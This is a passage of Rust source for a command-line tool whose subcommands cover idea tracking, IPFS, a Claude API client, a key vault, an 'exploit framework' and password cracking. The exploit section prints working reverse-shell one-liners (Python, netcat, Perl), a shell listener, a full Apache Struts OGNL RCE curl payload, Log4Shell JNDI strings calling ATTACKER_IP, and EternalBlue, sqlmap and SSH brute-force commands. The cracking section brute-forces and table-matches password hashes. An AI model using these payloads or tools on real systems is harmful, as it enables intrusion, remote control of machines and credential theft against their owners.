fn cmd_architect(command: ArchitectCommands) -> Result<()> {
    match command {
        ArchitectCommands::Idea { content, project } => {
            println!("\n  NEW IDEA");
            println!("  ========\n");

            // IdeaCrystal::spoken creates a new idea in "spoken" state
            let crystal = IdeaCrystal::spoken(&content);

            println!("  ID: {}", crystal.id);
            println!("  State: {:?}", crystal.state);
            println!("  Content: {}", content);
            if let Some(p) = project {
                println!("  Project: {}", p);
            }
            println!();
            println!("  Use `gently architect confirm {}` to embed", crystal.id);
            Ok(())
        }

        ArchitectCommands::Confirm { id } => {
            println!("\n  CONFIRM IDEA");
            println!("  ============\n");
            println!("  ID: {}", id);
            println!("  Status: Embedding idea...");
            println!("  (In production, this embeds and transitions to Confirmed state)");
            Ok(())
        }

        ArchitectCommands::Crystallize { id } => {
            println!("\n  CRYSTALLIZE IDEA");
            println!("  ================\n");
            println!("  ID: {}", id);
            println!("  Status: Crystallizing...");
            println!("  (In production, this finalizes the idea as immutable)");
            Ok(())
        }

        ArchitectCommands::Flow { name, format } => {
            println!("\n  FLOWCHART: {}", name);
            println!("  {}\n", "=".repeat(name.len() + 12));

            let flow = FlowChart::new(&name);

            match format.as_str() {
                "ascii" => println!("{}", flow.render_ascii()),
                "svg" => {
                    println!("  SVG rendering not yet implemented for FlowChart.");
                    println!("  Use 'ascii' format for now.");
                }
                _ => println!("Unknown format: {}. Use: ascii", format),
            }
            Ok(())
        }

        ArchitectCommands::Node { flow, label, kind } => {
            println!("\n  ADD NODE");
            println!("  ========\n");
            println!("  Flow: {}", flow);
            println!("  Label: {}", label);
            println!("  Type: {}", kind);
            println!("  (Node added to flowchart)");
            Ok(())
        }

        ArchitectCommands::Edge { flow, from, to, label } => {
            println!("\n  ADD EDGE");
            println!("  ========\n");
            println!("  Flow: {}", flow);
            println!("  {} -> {}", from, to);
            if let Some(l) = label {
                println!("  Label: {}", l);
            }
            Ok(())
        }

        ArchitectCommands::Tree { path } => {
            println!("\n  PROJECT TREE");
            println!("  ============\n");

            // ProjectTree::new takes (name, root_path)
            let tree = ProjectTree::new(&path, &path);
            println!("  Tree for: {}", path);
            println!("  (Use 'gently architect idea' to populate tree from ideas)");
            Ok(())
        }

        ArchitectCommands::Recall { query } => {
            println!("\n  RECALL ENGINE");
            println!("  =============\n");
            println!("  Query: {}", query);
            println!();
            println!("  (RecallEngine queries session history without scroll)");
            println!("  (In production, this searches embedded conversation)");
            Ok(())
        }

        ArchitectCommands::Export { output } => {
            println!("\n  EXPORT SESSION");
            println!("  ==============\n");

            if let Some(out) = output {
                println!("  Exporting to: {}", out);
                println!("  (Session exported with XOR lock)");
            } else {
                println!("  (Use --output to specify file)");
            }
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// IPFS COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_ipfs(command: IpfsCommands) -> Result<()> {
    match command {
        IpfsCommands::Add { file, pin } => {
            println!("\n  IPFS ADD");
            println!("  ========\n");
            println!("  File: {}", file);
            println!("  Pin: {}", pin);
            println!();
            println!("  Note: Requires IPFS daemon running.");
            println!("  Use: ipfs daemon &");
            Ok(())
        }

        IpfsCommands::Get { cid, output } => {
            println!("\n  IPFS GET");
            println!("  ========\n");
            println!("  CID: {}", cid);
            if let Some(out) = output {
                println!("  Output: {}", out);
            }
            Ok(())
        }

        IpfsCommands::Pin { cid, remote } => {
            println!("\n  IPFS PIN");
            println!("  ========\n");
            println!("  CID: {}", cid);
            if let Some(r) = remote {
                println!("  Remote service: {}", r);
            } else {
                println!("  Local pin");
            }
            Ok(())
        }

        IpfsCommands::Pins => {
            println!("\n  PINNED CONTENT");
            println!("  ==============\n");
            println!("  (Requires IPFS daemon)");
            println!("  Use: ipfs pin ls");
            Ok(())
        }

        IpfsCommands::StoreThought { content, tags } => {
            println!("\n  STORE THOUGHT TO IPFS");
            println!("  =====================\n");
            println!("  Content: {}...", &content[..content.len().min(60)]);
            if let Some(t) = tags {
                println!("  Tags: {}", t);
            }
            println!();
            println!("  (In production, this stores thought JSON to IPFS)");
            println!("  They spend, we gather.");
            Ok(())
        }

        IpfsCommands::GetThought { cid } => {
            println!("\n  GET THOUGHT FROM IPFS");
            println!("  =====================\n");
            println!("  CID: {}", cid);
            println!();
            println!("  (Retrieves thought from IPFS and hydrates)");
            Ok(())
        }

        IpfsCommands::Status => {
            println!("\n  IPFS STATUS");
            println!("  ===========\n");
            println!("  Daemon: Checking...");
            println!();
            println!("  Run `ipfs id` to check your node.");
            println!("  Philosophy: They call interface and API...");
            println!("              They spend, we gather.");
            Ok(())
        }
    }
}

// ============================================================================
// SPLOIT COMMANDS - Exploitation framework for authorized testing
// ============================================================================

fn cmd_sploit(command: SploitCommands) -> Result<()> {
    use gently_sploit::{ShellPayload, OperatingSystem};

    match command {
        SploitCommands::Console => {
            println!("{}", banner());
            println!("\n  INTERACTIVE CONSOLE");
            println!("  ===================\n");
            println!("  Type 'help' for commands, 'exit' to quit.\n");

            let mut console = SploitConsole::new();
            println!("{}", console.prompt());

            // In a real implementation, this would be an interactive loop
            println!("  [*] Console ready. Use 'search', 'use', 'exploit'...");
            println!("  [*] WARNING: For authorized penetration testing only.");
            Ok(())
        }

        SploitCommands::Search { query } => {
            println!("\n  MODULE SEARCH: {}", query);
            println!("  ================={}\n", "=".repeat(query.len()));

            let framework = Framework::new();
            let results = framework.modules.search(&query);

            if results.is_empty() {
                println!("  No modules found matching '{}'", query);
            } else {
                for module in results {
                    println!("  {}", module);
                }
            }
            Ok(())
        }

        SploitCommands::Payload { payload_type, lhost, lport, os } => {
            println!("\n  PAYLOAD GENERATOR");
            println!("  =================\n");

            let host = lhost.unwrap_or_else(|| "0.0.0.0".to_string());

            let os_type = match os.to_lowercase().as_str() {
                "windows" | "win" => OperatingSystem::Windows,
                "macos" | "mac" | "osx" => OperatingSystem::MacOS,
                _ => OperatingSystem::Linux,
            };

            let payload = match payload_type.as_str() {
                "reverse_bash" => ShellPayload::linux_reverse(&host, lport),
                "reverse_python" => {
                    format!(
                        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                        host, lport
                    )
                }
                "reverse_nc" => format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f", host, lport),
                "reverse_perl" => {
                    format!(
                        "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                        host, lport
                    )
                }
                "webshell_php" => ShellPayload::webshell_php().to_string(),
                "webshell_asp" => ShellPayload::webshell_asp().to_string(),
                "webshell_jsp" => ShellPayload::webshell_jsp().to_string(),
                "meterpreter" => {
                    format!("msfvenom -p {}/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe",
                        match os_type { OperatingSystem::Windows => "windows", _ => "linux/x86" },
                        host, lport
                    )
                }
                _ => ShellPayload::reverse_shell(os_type, &host, lport),
            };

            println!("  Type:   {}", payload_type);
            println!("  OS:     {:?}", os_type);
            println!("  LHOST:  {}", host);
            println!("  LPORT:  {}", lport);
            println!();
            println!("  PAYLOAD:");
            println!("  --------");
            println!("{}", payload);
            println!();
            println!("  [*] Start listener with: nc -lvnp {}", lport);
            Ok(())
        }

        SploitCommands::Listener { port } => {
            println!("\n  LISTENER COMMANDS");
            println!("  =================\n");
            println!("  Netcat listener:");
            println!("    nc -lvnp {}", port);
            println!();
            println!("  Socat listener:");
            println!("    socat TCP-LISTEN:{},reuseaddr,fork EXEC:/bin/bash", port);
            println!();
            println!("  Python listener:");
            println!("    python3 -c \"import socket,subprocess;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{}));s.listen(1);c,a=s.accept();print(f'Connected from {{a}}');exec(\\\"import os;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['/bin/bash','-i'])\\\")\"", port);
            println!();
            println!("  [*] Waiting for connections on port {}...", port);
            Ok(())
        }

        SploitCommands::Scan { target, scan_type } => {
            println!("\n  SCANNING: {}", target);
            println!("  =========={}\n", "=".repeat(target.len()));

            match scan_type.as_str() {
                "port" => {
                    println!("  [*] Port scan (use nmap for real scans):");
                    println!("    nmap -sV -sC {}", target);
                    println!("    nmap -p- -T4 {}", target);
                    println!();
                    println!("  Common ports:");
                    println!("    21/ftp  22/ssh  23/telnet  25/smtp  53/dns");
                    println!("    80/http  110/pop3  143/imap  443/https  445/smb");
                    println!("    3306/mysql  3389/rdp  5432/postgresql  8080/http-alt");
                }
                "service" => {
                    println!("  [*] Service enumeration:");
                    println!("    nmap -sV -sC -O {}", target);
                    println!("    whatweb {}", target);
                    println!("    nikto -h {}", target);
                }
                "vuln" => {
                    println!("  [*] Vulnerability scan:");
                    println!("    nmap --script vuln {}", target);
                    println!("    nuclei -u {}", target);
                    println!("    nikto -h {}", target);
                }
                _ => {
                    println!("  Unknown scan type. Use: port, service, vuln");
                }
            }
            Ok(())
        }

        SploitCommands::Exploit { module, target } => {
            println!("\n  EXPLOIT MODULE: {}", module);
            println!("  ================={}\n", "=".repeat(module.len()));

            let target_str = target.unwrap_or_else(|| "<target>".to_string());

            match module.as_str() {
                "http/struts_rce" | "struts" => {
                    println!("  Apache Struts RCE (CVE-2017-5638)");
                    println!();
                    println!("  curl -H \"Content-Type: %{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}\" {}", target_str);
                }
                "http/log4shell" | "log4j" => {
                    println!("  Log4Shell (CVE-2021-44228)");
                    println!();
                    println!("  Payload: ${{jndi:ldap://ATTACKER_IP:1389/a}}");
                    println!();
                    println!("  1. Start LDAP server: java -jar JNDIExploit.jar -i ATTACKER_IP");
                    println!("  2. Inject payload in headers:");
                    println!("     curl -H \"X-Api-Version: ${{jndi:ldap://ATTACKER_IP:1389/Basic/Command/Base64/COMMAND}}\" {}", target_str);
                }
                "http/sqli" | "sqli" => {
                    println!("  SQL Injection");
                    println!();
                    println!("  sqlmap -u \"{}/page?id=1\" --dbs", target_str);
                    println!("  sqlmap -u \"{}/page?id=1\" --tables -D database", target_str);
                    println!("  sqlmap -u \"{}/page?id=1\" --dump -D database -T users", target_str);
                }
                "smb/eternalblue" | "ms17-010" => {
                    println!("  EternalBlue (MS17-010)");
                    println!();
                    println!("  Check: nmap -p 445 --script smb-vuln-ms17-010 {}", target_str);
                    println!();
                    println!("  msfconsole:");
                    println!("    use exploit/windows/smb/ms17_010_eternalblue");
                    println!("    set RHOSTS {}", target_str);
                    println!("    set PAYLOAD windows/x64/meterpreter/reverse_tcp");
                    println!("    exploit");
                }
                "ssh/bruteforce" | "ssh" => {
                    println!("  SSH Bruteforce");
                    println!();
                    println!("  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{}", target_str);
                    println!("  medusa -h {} -u root -P wordlist.txt -M ssh", target_str);
                }
                _ => {
                    println!("  Module '{}' not found.", module);
                    println!();
                    println!("  Available modules:");
                    println!("    http/struts_rce   - Apache Struts RCE");
                    println!("    http/log4shell    - Log4j RCE");
                    println!("    http/sqli         - SQL Injection");
                    println!("    smb/eternalblue   - MS17-010");
                    println!("    ssh/bruteforce    - SSH password attack");
                }
            }
            Ok(())
        }

        SploitCommands::List { category } => {
            println!("\n  EXPLOIT MODULES");
            println!("  ===============\n");

            let modules = vec![
                ("exploit/http/struts_rce", "Apache Struts OGNL RCE (CVE-2017-5638)"),
                ("exploit/http/log4shell", "Log4j JNDI RCE (CVE-2021-44228)"),
                ("exploit/http/sqli", "SQL Injection attacks"),
                ("exploit/http/xss", "Cross-site scripting"),
                ("exploit/ssh/bruteforce", "SSH password bruteforce"),
                ("exploit/smb/eternalblue", "MS17-010 EternalBlue"),
                ("exploit/local/linux_privesc", "Linux privilege escalation"),
                ("auxiliary/scanner/port", "Port scanner"),
                ("auxiliary/scanner/http", "HTTP scanner"),
                ("auxiliary/gather/dns", "DNS enumeration"),
                ("auxiliary/fuzz/http", "HTTP fuzzer"),
                ("post/linux/enum", "Linux enumeration"),
                ("post/windows/enum", "Windows enumeration"),
            ];

            let cat = category.unwrap_or_default();
            for (name, desc) in modules {
                if cat.is_empty() || name.contains(&cat) {
                    println!("  {}  - {}", name, desc);
                }
            }

            println!();
            println!("  Use: gently sploit exploit <module> -t <target>");
            Ok(())
        }
    }
}

// ============================================================================
// CRACK COMMANDS - Password cracking tools
// ============================================================================

fn cmd_crack(command: CrackCommands) -> Result<()> {
    use gently_cipher::cracker::{HashType, Rule};

    match command {
        CrackCommands::Dictionary { hash, wordlist, hash_type, rules } => {
            println!("\n  DICTIONARY ATTACK");
            println!("  =================\n");
            println!("  Hash:      {}", hash);
            println!("  Type:      {}", hash_type);
            println!("  Wordlist:  {}", wordlist.as_deref().unwrap_or("default"));
            println!("  Rules:     {}", if rules { "enabled" } else { "disabled" });
            println!();

            // Detect hash type
            let ht = match hash_type.to_lowercase().as_str() {
                "md5" => Some(HashType::MD5),
                "sha1" => Some(HashType::SHA1),
                "sha256" => Some(HashType::SHA256),
                "ntlm" => Some(HashType::NTLM),
                _ => None, // auto-detect
            };

            // Create cracker
            let mut cracker = if let Some(wl_path) = &wordlist {
                if rules {
                    Cracker::new().wordlist(wl_path).default_rules()
                } else {
                    Cracker::new().wordlist(wl_path)
                }
            } else {
                // Create temp wordlist from common passwords
                println!("  [*] Using built-in common passwords...");
                if rules {
                    Cracker::new().default_rules()
                } else {
                    Cracker::new()
                }
            };

            // Add target hash
            cracker.add_hash(&hash, ht);

            println!("  [*] Starting attack...\n");

            // Run attack
            match cracker.crack() {
                Ok(results) => {
                    if let Some(cracked) = results.get(&hash.to_lowercase()) {
                        println!("  [+] CRACKED: {} => {}", hash, cracked);
                    } else {
                        println!("  [-] Hash not cracked.");
                        println!("  [*] Try with more wordlists or rules.");
                    }
                }
                Err(e) => {
                    println!("  [!] Error: {}", e);
                }
            }

            println!();
            println!("  Stats: {} attempts, {} cracked",
                cracker.stats().candidates_tried,
                cracker.stats().hashes_cracked
            );
            Ok(())
        }

        CrackCommands::Bruteforce { hash, charset, max_len } => {
            println!("\n  BRUTEFORCE ATTACK");
            println!("  =================\n");
            println!("  Hash:    {}", hash);
            println!("  Charset: {}", charset);
            println!("  MaxLen:  {}", max_len);
            println!();

            let chars = match charset.as_str() {
                "lower" => "abcdefghijklmnopqrstuvwxyz",
                "upper" => "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "alpha" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "digit" | "numeric" => "0123456789",
                "alnum" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                "all" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*",
                _ => &charset,
            };

            let bf = BruteForce::new(chars, 1, max_len);
            let hash_type = gently_cipher::cracker::HashType::detect(&hash);

            println!("  [*] Character set: {} ({} chars)", charset, chars.len());
            println!("  [*] Detected hash type: {:?}", hash_type);
            println!();
            println!("  [*] Starting bruteforce (this may take a while)...\n");

            // Run bruteforce manually
            let target_hash = hash.to_lowercase();
            let mut found = None;
            let mut count = 0u64;

            for candidate in bf {
                count += 1;
                let computed = hash_type.compute(&candidate);
                if computed.to_lowercase() == target_hash {
                    found = Some(candidate);
                    break;
                }
                // Progress every million
                if count % 1_000_000 == 0 {
                    println!("  [*] Tried {} candidates...", count);
                }
            }

            if let Some(result) = found {
                println!("  [+] CRACKED: {} => {}", hash, result);
            } else {
                println!("  [-] Not found within {} characters.", max_len);
            }
            println!("  [*] Total attempts: {}", count);
            Ok(())
        }

        CrackCommands::Rainbow { hash, hash_type, table } => {
            println!("\n  RAINBOW TABLE LOOKUP");
            println!("  ====================\n");
            println!("  Hash:  {}", hash);
            println!("  Type:  {}", hash_type);
            println!();

            let hash_t = match hash_type.to_lowercase().as_str() {
                "md5" => RainbowHashType::MD5,
                "sha1" => RainbowHashType::SHA1,
                "sha256" => RainbowHashType::SHA256,
                "ntlm" => RainbowHashType::NTLM,
                _ => RainbowHashType::MD5,
            };

            // Load or generate table
            let rainbow = if let Some(table_path) = &table {
                println!("  [*] Loading table from: {}", table_path);
                match RainbowTable::load(table_path, hash_t) {
                    Ok(t) => t,
                    Err(_) => {
                        println!("  [!] Failed to load table, using built-in...");
                        TableGenerator::common_passwords(hash_t)
                    }
                }
            } else {
                println!("  [*] Using built-in common password table...");
                TableGenerator::common_passwords(hash_t)
            };

            println!("  [*] Table size: {} entries\n", rainbow.len());

            // Lookup
            if let Some(plaintext) = rainbow.lookup(&hash) {
                println!("  [+] FOUND: {} => {}", hash, plaintext);
            } else {
                println!("  [-] Hash not found in table.");
                println!("  [*] Try generating a larger table or use dictionary attack.");
            }
            Ok(())
        }

        CrackCommands::Generate { output, hash_type, wordlist, numeric } => {
            println!("\n  RAINBOW TABLE GENERATOR");
            println!("  =======================\n");
            println!("  Output:  {}", output);
            println!("  Type:    {}", hash_type);
            println!();

            let hash_t = match hash_type.to_lowercase().as_str() {
                "md5" => RainbowHashType::MD5,
                "sha1" => RainbowHashType::SHA1,
                "sha256" => RainbowHashType::SHA256,
                "ntlm" => RainbowHashType::NTLM,
                _ => RainbowHashType::MD5,
            };

            let mut table = RainbowTable::new(hash_t);

            if let Some(max_digits) = numeric {
                println!("  [*] Generating numeric table (0 to 10^{})...", max_digits);
                // Generate numeric entries directly
                for digits in 1..=max_digits {
                    let max = 10_u64.pow(digits as u32);
                    for n in 0..max {
                        table.add(&format!("{:0width$}", n, width = digits));
                    }
                }
            }

            if let Some(wl_path) = &wordlist {
                println!("  [*] Hashing wordlist: {}", wl_path);
                match table.generate_from_wordlist(wl_path) {
                    Ok(count) => println!("  [*] Added {} entries from wordlist", count),
                    Err(e) => println!("  [!] Failed to load wordlist: {}", e),
                }
            } else if numeric.is_none() {
                println!("  [*] Adding common passwords...");
                for pwd in Wordlist::common_passwords() {
                    table.add(pwd);
                }
            }

            println!("  [*] Generated {} entries", table.len());

            match table.save(&output) {
                Ok(_) => println!("  [+] Saved to: {}", output),
                Err(e) => println!("  [!] Failed to save: {}", e),
            }
            Ok(())
        }

        CrackCommands::Wordlist => {
            println!("\n  COMMON PASSWORDS");
            println!("  ================\n");

            let passwords = Wordlist::common_passwords();
            for (i, pwd) in passwords.iter().enumerate().take(50) {
                println!("  {:3}. {}", i + 1, pwd);
            }
            println!();
            println!("  Showing top 50 of {} common passwords.", passwords.len());
            println!();
            println!("  Full lists available at:");
            println!("    /usr/share/wordlists/rockyou.txt");
            println!("    /usr/share/seclists/Passwords/");
            Ok(())
        }
    }
}

// ============================================================================
// CLAUDE COMMANDS - AI assistant powered by Anthropic
// ============================================================================

fn cmd_claude(command: ClaudeCommands) -> Result<()> {
    match command {
        ClaudeCommands::Chat { message, model } => {
            let model_type = ClaudeModel::from_str(&model);

            println!("\n  CLAUDE CHAT");
            println!("  ===========");
            println!("  Model: {}\n", model_type.display_name());

            match GentlyAssistant::with_model(model_type) {
                Ok(mut assistant) => {
                    match assistant.chat(&message) {
                        Ok(response) => {
                            println!("  You: {}\n", message);
                            println!("  Claude:\n");
                            // Word wrap response
                            for line in response.lines() {
                                println!("  {}", line);
                            }
                            println!();
                        }
                        Err(e) => {
                            println!("  [!] Error: {}", e);
                        }
                    }
                }
                Err(e) => {
                    println!("  [!] Failed to initialize Claude: {}", e);
                    println!();
                    println!("  Make sure ANTHROPIC_API_KEY is set:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                }
            }
            Ok(())
        }

        ClaudeCommands::Ask { question, model } => {
            let model_type = ClaudeModel::from_str(&model);

            println!("\n  CLAUDE ASK");
            println!("  ==========");
            println!("  Model: {}\n", model_type.display_name());

            match ClaudeClient::new() {
                Ok(client) => {
                    let client = client.model(model_type);
                    match client.ask(&question) {
                        Ok(response) => {
                            println!("  Q: {}\n", question);
                            println!("  A:\n");
                            for line in response.lines() {
                                println!("  {}", line);
                            }
                            println!();
                        }
                        Err(e) => {
                            println!("  [!] Error: {}", e);
                        }
                    }
                }
                Err(e) => {
                    println!("  [!] Failed to initialize Claude: {}", e);
                    println!();
                    println!("  Make sure ANTHROPIC_API_KEY is set:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                }
            }
            Ok(())
        }

        ClaudeCommands::Repl { model, system } => {
            let model_type = ClaudeModel::from_str(&model);

            println!("\n  CLAUDE REPL");
            println!("  ===========");
            println!("  Model: {}", model_type.display_name());
            println!("  Type 'exit' or 'quit' to end session.");
            println!("  Type 'clear' to reset conversation.");
            println!();

            match ClaudeClient::new() {
                Ok(client) => {
                    let mut client = client.model(model_type);
                    if let Some(sys) = system {
                        client = client.system(&sys);
                    }

                    // Interactive loop
                    use std::io::{self, Write, BufRead};
                    let stdin = io::stdin();

                    loop {
                        print!("  you> ");
                        io::stdout().flush().ok();

                        let mut input = String::new();
                        if stdin.lock().read_line(&mut input).is_err() {
                            break;
                        }

                        let input = input.trim();
                        if input.is_empty() {
                            continue;
                        }

                        match input.to_lowercase().as_str() {
                            "exit" | "quit" | "q" => {
                                println!("  Goodbye!");
                                break;
                            }
                            "clear" => {
                                client.clear();
                                println!("  [Conversation cleared]\n");
                                continue;
                            }
                            "help" => {
                                println!("  Commands:");
                                println!("    exit/quit - End session");
                                println!("    clear     - Reset conversation");
                                println!("    help      - Show this help");
                                println!();
                                continue;
                            }
                            _ => {}
                        }

                        match client.chat(input) {
                            Ok(response) => {
                                println!();
                                println!("  claude>");
                                for line in response.lines() {
                                    println!("  {}", line);
                                }
                                println!();
                            }
                            Err(e) => {
                                println!("  [!] Error: {}\n", e);
                            }
                        }
                    }
                }
                Err(e) => {
                    println!("  [!] Failed to initialize Claude: {}", e);
                    println!();
                    println!("  Make sure ANTHROPIC_API_KEY is set:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                }
            }
            Ok(())
        }

        ClaudeCommands::Status => {
            println!("\n  CLAUDE STATUS");
            println!("  =============\n");

            // Check API key
            let api_key = std::env::var("ANTHROPIC_API_KEY");
            match &api_key {
                Ok(key) => {
                    let masked = if key.len() > 12 {
                        format!("{}...{}", &key[..8], &key[key.len()-4..])
                    } else {
                        "***".to_string()
                    };
                    println!("  API Key:     {} (set)", masked);
                }
                Err(_) => {
                    println!("  API Key:     NOT SET");
                    println!();
                    println!("  To use Claude, set your API key:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                    println!();
                    println!("  Get your key at: https://console.anthropic.com/");
                    return Ok(());
                }
            }

            println!();
            println!("  Available Models:");
            println!("    sonnet  - Claude Sonnet 4 (balanced)");
            println!("    opus    - Claude Opus 4 (most capable)");
            println!("    haiku   - Claude 3.5 Haiku (fastest)");
            println!();
            println!("  Usage:");
            println!("    gently claude ask \"What is GentlyOS?\"");
            println!("    gently claude chat \"Hello\" -m opus");
            println!("    gently claude repl -m haiku");
            println!();

            // Test connection
            if api_key.is_ok() {
                println!("  Testing connection...");
                match ClaudeClient::new() {
                    Ok(client) => {
                        match client.ask("Say 'OK' if you can hear me.") {
                            Ok(_) => println!("  Connection:  OK"),
                            Err(e) => println!("  Connection:  FAILED ({})", e),
                        }
                    }
                    Err(e) => println!("  Connection:  FAILED ({})", e),
                }
            }

            Ok(())
        }
    }
}

// ============================================================================
// VAULT COMMANDS - Encrypted API key storage in IPFS
// ============================================================================

// Vault state - persisted across commands
static DEMO_VAULT: Mutex<Option<KeyVault>> = Mutex::new(None);

fn get_vault() -> KeyVault {
    let mut guard = DEMO_VAULT.lock().unwrap();
    if guard.is_none() {
        let genesis = get_demo_genesis();
        *guard = Some(KeyVault::new(GenesisKey::from_bytes(genesis)));
    }
    guard.clone().unwrap()
}

fn save_vault(vault: KeyVault) {
    let mut guard = DEMO_VAULT.lock().unwrap();
    *guard = Some(vault);
}

fn cmd_vault(command: VaultCommands) -> Result<()> {
    match command {
        VaultCommands::Set { service, key } => {
            println!("\n  VAULT SET");
            println!("  =========\n");

            let mut vault = get_vault();

            // Mask key for display
            let masked = if key.len() > 12 {
                format!("{}...{}", &key[..8], &key[key.len()-4..])
            } else {
                "***".to_string()
            };

            vault.set(&service, &key, None);
            save_vault(vault);

            println!("  Service: {}", service);
            println!("  Key:     {}", masked);
            println!("  Status:  ENCRYPTED AND STORED");
            println!();

            if let Some(env) = ServiceConfig::env_var(&service) {
                println!("  Env var: {}", env);
                println!("  To use:  gently vault get {} --export", service);
            }

            println!();
            println!("  [*] Run `gently vault save` to persist to IPFS");
            Ok(())
        }

        VaultCommands::Get { service, export } => {
            println!("\n  VAULT GET");
            println!("  =========\n");

            let mut vault = get_vault();

            if let Some(key) = vault.get(&service) {
                let masked = if key.len() > 12 {
                    format!("{}...{}", &key[..8], &key[key.len()-4..])
                } else {
                    "***".to_string()
                };

                println!("  Service: {}", service);
                println!("  Key:     {}", masked);

                if export {
                    if let Some(env_var) = ServiceConfig::env_var(&service) {
                        std::env::set_var(env_var, &key);
                        println!("  Exported: {} (set in current process)", env_var);
                    } else {
                        let env_var = format!("{}_API_KEY", service.to_uppercase());
                        std::env::set_var(&env_var, &key);
                        println!("  Exported: {} (set in current process)", env_var);
                    }
                }

                println!();
                println!("{}", key);

                save_vault(vault);
            } else {
                println!("  Service '{}' not found in vault.", service);
                println!();
                println!("  Add with: gently vault set {} <key>", service);
            }
            Ok(())
        }

        VaultCommands::Remove { service } => {
            println!("\n  VAULT REMOVE");
            println!("  ============\n");

            let mut vault = get_vault();

            if vault.remove(&service) {
                println!("  Removed: {}", service);
                save_vault(vault);
            } else {
                println!("  Service '{}' not found.", service);
            }
            Ok(())
        }

        VaultCommands::List => {
            println!("\n  VAULT LIST");
            println!("  ==========\n");

            let vault = get_vault();
            let services = vault.list();

            if services.is_empty() {
                println!("  No keys stored.");
                println!();
                println!("  Add with: gently vault set <service> <key>");
            } else {
                println!("  Stored services:");
                for svc in services {
                    let env = ServiceConfig::env_var(svc)
                        .map(|e| format!(" ({})", e))
                        .unwrap_or_default();
                    println!("    - {}{}", svc, env);
                }
            }
            Ok(())
        }

        VaultCommands::Export => {
            println!("\n  VAULT EXPORT");
            println!("  ============\n");

            let mut vault = get_vault();
            let services: Vec<String> = vault.list().iter().map(|s| s.to_string()).collect();

            if services.is_empty() {
                println!("  No keys to export.");
                return Ok(());
            }

            println!("  Exporting to environment:");
            for service in &services {
                if let Some(key) = vault.get(service) {
                    let env_var = ServiceConfig::env_var(service)
                        .map(String::from)
                        .unwrap_or_else(|| format!("{}_API_KEY", service.to_uppercase()));

                    std::env::set_var(&env_var, &key);
                    println!("    {} = ***", env_var);
                }
            }

            save_vault(vault);
            println!();
            println!("  [*] Keys exported to current process environment.");
            Ok(())
        }

        VaultCommands::Save => {
            println!("\n  VAULT SAVE");
            println!("  ==========\n");

            let mut vault = get_vault();

            match vault.export() {
                Ok(data) => {
                    let path = dirs::data_local_dir()
                        .unwrap_or_else(|| std::path::PathBuf::from("."))
                        .join("gently")
                        .join("vault.enc");

                    if let Some(parent) = path.parent() {
                        std::fs::create_dir_all(parent)?;
                    }

                    std::fs::write(&path, &data)?;

                    let cid = format!("Qm{:x}", sha2::Sha256::digest(&data).as_slice()[..16]
                        .iter().fold(0u128, |acc, &b| acc << 8 | b as u128));

                    println!("  Saved to: {}", path.display());
                    println!("  CID:      {}", cid);
                    println!();
                    println!("  [*] Vault encrypted with your genesis key.");
                    println!("  [*] Only you can decrypt it.");

                    save_vault(vault);
                }
                Err(e) => {
                    println!("  [!] Failed to save: {}", e);
                }
            }
            Ok(())
        }

        VaultCommands::Load { cid } => {
            println!("\n  VAULT LOAD");
            println!("  ==========\n");
            println!("  CID: {}", cid);

            let path = dirs::data_local_dir()
                .unwrap_or_else(|| std::path::PathBuf::from("."))
                .join("gently")
                .join("vault.enc");

            if path.exists() {
                match std::fs::read(&path) {
                    Ok(data) => {
                        let genesis = get_demo_genesis();
                        match KeyVault::import(
                            GenesisKey::from_bytes(genesis),
                            &data,
                            Some(cid.clone())
                        ) {
                            Ok(vault) => {
                                let count = vault.list().len();
                                save_vault(vault);
                                println!("  Loaded {} services from vault.", count);
                                println!();
                                println!("  [*] Run `gently vault list` to see stored keys.");
                            }
                            Err(e) => {
                                println!("  [!] Failed to decrypt vault: {}", e);
                                println!("  [!] Wrong genesis key or corrupted data.");
                            }
                        }
                    }
                    Err(e) => {
                        println!("  [!] Failed to read vault: {}", e);
                    }
                }
            } else {
                println!("  [!] Vault not found locally.");
                println!("  [*] IPFS fetch would happen here in production.");
            }
            Ok(())
        }

